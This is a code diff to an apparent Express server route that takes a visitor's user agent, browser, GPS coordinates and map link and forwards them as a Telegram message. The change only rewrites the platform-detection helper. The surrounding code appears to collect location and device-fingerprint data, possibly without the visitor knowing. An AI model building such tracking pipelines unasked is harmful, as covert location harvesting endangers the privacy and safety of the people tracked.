@@ -73,21 +73,23 @@ app.post("/send-to-telegram", async (req, res) => {
       latitude, longitude, mapLink
     } = req.body;
 
-    function getFriendlyPlatform(platform, userAgent) {
-      platform = (platform || "").toLowerCase();
+    function getFriendlyPlatform(userAgent, platform) {
+  const ua = userAgent.toLowerCase();
 
-      if (platform.includes("win")) return "Windows";
-      if (platform.includes("mac")) return "macOS";
-      if (platform.includes("linux")) return "Linux";
-      if (/android/.test(userAgent.toLowerCase())) return "Android";
-      if (/iphone|ipad|ipod/.test(userAgent.toLowerCase())) return "iOS";
+  if (/android/.test(ua)) return "Android";
+  if (/iphone|ipad|ipod/.test(ua)) return "iOS";
+  if (/windows phone/.test(ua)) return "Windows Phone";
+  if (/windows/.test(ua)) return "Windows";
+  if (/macintosh|mac os x/.test(ua)) return "Mac OS";
+  if (/linux/.test(ua)) return "Linux";
 
-      return platform || "Unknown";
-    }
+  // fallback to whatever navigator.platform gave
+  return platform || "Unknown";
+}
 
-    const friendlyPlatform = getFriendlyPlatform(platform, userAgent);
+    const friendlyPlatform = getFriendlyPlatform(userAgent, platform);
 
-    const message = `
+const message = `
 📋 *Device Info:*
 🤖 *User Agent:* ${escapeMarkdownV2(userAgent)}
 🌐 *Browser:* ${escapeMarkdownV2(browserName)}
